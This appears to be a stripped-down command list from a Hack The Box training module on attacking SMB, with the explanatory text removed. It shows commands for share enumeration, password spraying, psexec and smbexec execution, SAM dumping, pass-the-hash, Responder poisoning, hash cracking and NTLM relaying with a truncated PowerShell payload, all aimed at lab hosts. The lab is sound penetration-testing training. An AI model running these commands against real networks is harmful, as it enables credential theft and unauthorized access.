...
Attacking SMB  
```
Pavlo142@htb[/htb]$ sudo nmap 10.129.14.128 -sV -sC -p139,445
...
Attacking SMB  
```
Pavlo142@htb[/htb]$ smbclient -N -L //10.129.14.128
...
Attacking SMB  
```
Pavlo142@htb[/htb]$ smbmap -H 10.129.14.128
...
Attacking SMB  
```
Pavlo142@htb[/htb]$ smbmap -H 10.129.14.128 -r notes
...
Attacking SMB  
```
Pavlo142@htb[/htb]$ smbmap -H 10.129.14.128 --download "notes\note.txt"
...
Attacking SMB  
```
Pavlo142@htb[/htb]$ smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"
...
Attacking SMB  
```
Pavlo142@htb[/htb]$ rpcclient -U'%' 10.10.110.17
...
Attacking SMB  
```
Pavlo142@htb[/htb]$ ./enum4linux-ng.py 10.10.11.45 -A -C
...
Attacking SMB  
```
Pavlo142@htb[/htb]$ cat /tmp/userlist.txt
...
Attacking SMB  
```
Pavlo142@htb[/htb]$ crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
...
Attacking SMB  
```
Pavlo142@htb[/htb]$ impacket-psexec -h
...
Attacking SMB  
```
Pavlo142@htb[/htb]$ impacket-psexec administrator:'Password123!'@10.10.110.17
...
Attacking SMB  
```
Pavlo142@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
...
Attacking SMB  
```
Pavlo142@htb[/htb]$ crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
...
Attacking SMB  
```
Pavlo142@htb[/htb]$ crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
...
Attacking SMB  
```
Pavlo142@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
...
Attacking SMB  
```
Pavlo142@htb[/htb]$ responder -I <interface name>
...
Attacking SMB  
```
Pavlo142@htb[/htb]$ sudo responder -I ens33
...
Attacking SMB  
```
Pavlo142@htb[/htb]$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
...
Attacking SMB  
```
Pavlo142@htb[/htb]$ cat /etc/responder/Responder.conf | grep 'SMB ='
...
Attacking SMB  
```
Pavlo142@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
...
Attacking SMB  
```
Pavlo142@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e '
